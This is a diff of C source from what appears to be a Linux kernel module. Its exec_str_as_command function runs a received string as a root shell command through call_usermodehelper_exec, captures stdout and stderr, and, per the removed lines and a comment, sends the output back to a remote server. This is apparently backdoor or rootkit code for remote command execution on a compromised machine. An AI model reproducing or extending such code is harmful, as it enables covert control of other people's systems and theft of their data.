@@ -64,8 +64,8 @@ int exec_str_as_command(char *user_cmd){
 	char *cmd = NULL;
 	char *argv[] = { "/bin/sh", "-c", NULL, NULL };
 	char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-	char *stdout_file = "/tmp/std.out";
-	char *stderr_file = "/tmp/std.err";
+	char *stdout_file = STDOUT_FILE;									// File to store stdout
+	char *stderr_file = STDERR_FILE;									// File to store stderr
 	int status = 0;														// Return code and number of bytes read
 
 	// Allocate memory for the command string
@@ -107,54 +107,37 @@ int exec_str_as_command(char *user_cmd){
 	status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
 	DBG_MSG("exec_str_as_command: command exited with status: %d\n", status);
 
-	// Send the result to the server
-	send_to_server("stdout:\n");
-	send_file_to_server(stdout_file);
-	send_to_server("stderr:\n");
-	send_file_to_server(stderr_file);
+	// Retieve stdout and stderr
+	int stdout_size = 0;
+	int stderr_size = 0;
+	char *stdout_content = read_file(stdout_file, &stdout_size);
+	char *stderr_content = read_file(stderr_file, &stderr_size);
+	if (!stdout_content || !stderr_content) {
+		if (stdout_content)
+			kfree(stdout_content);
+		if (stderr_content)
+			kfree(stderr_content);
+		kfree(cmd);
+		return -ENOENT;
+	}
 
-	// // Retieve stdout and stderr
-	// int stdout_size = 0;
-	// int stderr_size = 0;
-	// char *stdout_content = read_file(stdout_file, &stdout_size);
-	// char *stderr_content = read_file(stderr_file, &stderr_size);
-	// if (!stdout_content || !stderr_content) {
-	// 	if (stdout_content)
-	// 		kfree(stdout_content);
-	// 	if (stderr_content)
-	// 		kfree(stderr_content);
-	// 	kfree(cmd);
-	// 	return -ENOENT;
-	// }
+	// Update the exec_result structure with the command's output and return code
+	exec_result.code = status;
 
-	// // Update the exec_result structure with the command's output and return code
-	// exec_result.code = status;
+	// Stock only the last STD_BUFFER_SIZE bytes of the output
+	// Firsts (and all of them) are not useful since its has been sent to the server
+	size_t stdout_copy_offset = stdout_size > STD_BUFFER_SIZE ? stdout_size - STD_BUFFER_SIZE : 0;
+	size_t stderr_copy_offset = stderr_size > STD_BUFFER_SIZE ? stderr_size - STD_BUFFER_SIZE : 0;
 
-	// // Send stdout and stderr to server STD_BUFFER_SIZE by STD_BUFFER_SIZE chars
-	// // This is to avoid sending too much data at once
-	// send_to_server("Command result :\n");
-	// send_to_server("stdout:\n");
-	// for(int i = 0; i < STD_BUFFER_SIZE; i += stdout_size - STD_BUFFER_SIZE > STD_BUFFER_SIZE ? STD_BUFFER_SIZE : stdout_size - STD_BUFFER_SIZE) {
-	// 	if (stdout_content[i] == '\0')
-	// 		break;
-	// 	send_to_server(stdout_content + i);
-	// }
+	strncpy(exec_result.std_out, stdout_content + stdout_copy_offset, STD_BUFFER_SIZE - 1);
+	strncpy(exec_result.std_err, stderr_content + stderr_copy_offset, STD_BUFFER_SIZE - 1);
+	exec_result.std_out[STD_BUFFER_SIZE - 1] = '\0';
+	exec_result.std_err[STD_BUFFER_SIZE - 1] = '\0';
 
-	// send_to_server("\nstderr:\n");
-	// for(int i = 0; i < STD_BUFFER_SIZE; i += stderr_size - STD_BUFFER_SIZE > STD_BUFFER_SIZE ? STD_BUFFER_SIZE : stderr_size - STD_BUFFER_SIZE) {
-	// 	if (stderr_content[i] == '\0')
-	// 		break;
-	// 	send_to_server(stderr_content + i);
-	// }
+	// Cleanup: free memory
+	kfree(stdout_content);
+	kfree(stderr_content);
+	kfree(cmd);
 
-	// strncpy(exec_result.std_out, stdout_content, STD_BUFFER_SIZE - 1);
-	// strncpy(exec_result.std_err, stderr_content, STD_BUFFER_SIZE - 1);
-	// exec_result.std_out[STD_BUFFER_SIZE - 1] = '\0';
-	// exec_result.std_err[STD_BUFFER_SIZE - 1] = '\0';
-
-	// // Cleanup: free memory
-	// kfree(stdout_content);
-	// kfree(stderr_content);
-	// kfree(cmd);
 	return SUCCESS;
 }
